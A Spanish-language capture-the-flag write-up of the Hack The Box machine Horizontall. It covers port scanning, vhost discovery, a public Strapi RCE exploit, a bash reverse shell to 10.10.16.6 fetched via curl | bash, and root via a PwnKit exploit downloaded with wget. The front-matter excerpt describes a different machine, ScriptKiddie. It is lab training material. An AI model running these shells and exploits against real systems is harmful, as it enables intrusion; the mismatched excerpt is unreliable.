---
layout: single
title: ScriptKiddie - Hack The Box
excerpt: "ScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability ([CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384)), along with classic attacks such as OS command injection and an insecure passwordless `sudo` configuration. Initial foothold on the machine is gained by uploading a malicious `.apk` file from a web interface that calls a vulnerable version of `msfvenom` to generate downloadable payloads. Once shell is obtained, lateral movement to a second user is performed by injecting commands into a log file which provides unsanitized input to a Bash script that is triggered on file modification. This user is allowed to run `msfconsole` as `root` via `sudo` without supplying a password, resulting in the escalation of privileges. " 
date: 2024-04-19
classes: wide
header:
  teaser: /assets/images/htb-horizontall/Horizontall.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Pkexec
  - Strapi
  - Directorios
---

![](/assets/images/htb-horizontall/Horizontall.png)

Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed. Enumeration of the website reveals that it is built using the Vue JS framework. Reviewing the source code of the Javascript file, a new virtual host is discovered. This host contains the `Strapi Headless CMS` which is vulnerable to two CVEs allowing potential attackers to gain remote code execution on the system as the `strapi` user. Then, after enumerating services listening only on localhost on the remote machine, a Laravel instance is discovered. In order to access the port that Laravel is listening on, SSH tunnelling is used. The Laravel framework installed is outdated and running on debug mode. Another CVE can be exploited to gain remote code execution through Laravel as `root`. 

## Portscan

```
Ricart0@kali:/home/kali/HTB/Horizontall/nmap -> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.11.105 -oG allports
[sudo] contraseña para kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 23:30 CET
Initiating Ping Scan at 23:30
Scanning 10.10.11.105 [4 ports]
Completed Ping Scan at 23:30, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:30
Scanning 10.10.11.105 [65535 ports]
Discovered open port 80/tcp on 10.10.11.105
Discovered open port 22/tcp on 10.10.11.105
Completed SYN Stealth Scan at 23:30, 12.20s elapsed (65535 total ports)
Nmap scan report for 10.10.11.105
Host is up, received echo-reply ttl 63 (0.071s latency).
Scanned at 2024-02-21 23:30:41 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
           Raw packets sent: 65841 (2.897MB) | Rcvd: 65841 (2.634MB)

```
Y con esto analizamos los puertos abiertos:
```
Ricart0@kali:/home/kali/HTB/Horizontall/nmap -> nmap -sCV -p22,80 10.10.11.105 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 23:34 CET
Nmap scan report for 10.10.11.105
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
```
## Directorios existentes

Obtenemos del escaneo de puertos la url de http://horizontall.htb, asi que vamos a adentrarnos a ver que tiene, y vemos que no hay nada que explotar, por tanto, vamos a buscar directorios existentes de la página web a ver si podemos encontrar algo: 
```
Dirsearch started Wed Feb 21 23:52:50 2024 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://horizontall.htb/

301   194B   http://horizontall.htb/js    -> REDIRECTS TO: http://horizontall.htb/js/
301   194B   http://horizontall.htb/css    -> REDIRECTS TO: http://horizontall.htb/css/
200     4KB  http://horizontall.htb/favicon.ico
301   194B   http://horizontall.htb/img    -> REDIRECTS TO: http://horizontall.htb/img/
403   580B   http://horizontall.htb/js/
```
Comprobamos su contenido y no deja entrar en ningun directorio.
Asi que lanzamos un curl a la url de tipo get para analizar el contenido de la pagina y posibles urls en el código, lo filtramos para que nos muestre lo que hay entre comillas '".*?"' y que contienen app, tambien que no se repita ningun resultado:
```
Ricart0@kali:/home/kali/HTB/Horizontall -> curl -s -X GET "http://horizontall.htb/" | grep -oP '".*?"' | grep app\. | sort -u
"app"
"/css/app.0f40a091.css"
"/js/app.c68eb462.js"
```
Ahora si, en el contenido de "/js/app.c68eb462.js", encontramos contenido, asi que volvermos a filtrar por comillas,  en busca de una url, y filtramos por http para encontrar url's.

```
curl -s -X GET "http://horizontall.htb/js/app.c68eb462.js" | grep -oP '".*?"' | grep http | sort -u                                                                 130 ⨯
"http://api-prod.horizontall.htb/reviews"
"https://horizontall.htb"
"http://www.w3.org/2000/svg"
```

## Página web

Encontramos esta url que parece tener contenido "http://api-prod.horizontall.htb/reviews", asi que la añadimos a /etc/hosts y buscamos en el navegador.

Una vez sabido esto, podemos volver a hacer una búsqueda de directorios como antes, en la nueva pagina web. Esto nos devuelve que existe un directorio /admin, que si ejecutamos en el navegador nos lleva a un panel de autenticación:

![](/assets/images/htb-horizontall/pagina1.png)

Como vemos es un strapi, asi que vamos a buscar posibles sploits para ejecutar:
```
Ricart0@kali:/home/kali/HTB/Horizontall -> searchsploit strapi                                                    
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                                 | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                               | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                         | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                                           | nodejs/webapps/50716.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Intrusión
Tenemos un sploit para la ocasion en la que no estamos autenticados, lo vamos a usar:
![](/assets/images/htb-horizontall/int1.png)

Ya tendriamos ejecucion de comandos, asi que vamos a intentar montarnos una reverse shell mandando un curl a nuestra ip, montandonos un servidor en python3 y escuchando por el puerto 443. Creamos un index.html que devuelva una bash:
```
Ricart0@kali:/home/kali/HTB/Horizontall/exploits -> cat index.html         
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.6/443 0>&1 
```
Y ahora mandamos un curl y que lo interprete con bash: curl http://10.10.16.6/ | bash
Y nos montamos el servidor en python(python3 -m http.server 80) y escucha por el puerto 443(nc -nvlp 443). Y estamos dentro:
![](/assets/images/htb-horizontall/int2.png)

## Escalada de privilegios

En el directorio home encontramos la flag del usuario:
```
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt
a3eb4b24b2c7c90ec8bfcde966163c55
```
Ahora toca escalar privilegios para obtener la flag de root. Vemos que pkexec se ecuentra disponible, muy vulnerable:
```
strapi@horizontall:~/myapi/config/environments/development$ which pkexec
which pkexec
/usr/bin/pkexec
```
Desde nuestra terminal, vamos a clonarnos este repositorio https://github.com/berdav/CVE-2021-4034 que nos va a escalar el privilegio mediante pkexec, la comprimimos (zip -r comprimido.zip CVE-2021-4034). Desde el equipo de la víctima, obtenemos el zip de nuestro equipo(wget http://10.10.16.6/comprimido.zip). Lo descomprimimos, hacemos make, y lo ejecutamos:
```
strapi@horizontall:~/myapi/config/environments/development/CVE-2021-4034$ ./cve-2021-4034
<ronments/development/CVE-2021-4034$ ./cve-2021-4034                      
whoami
root
```
A partir de ahi, buscamos la flag de root y ya lo tenemos. 
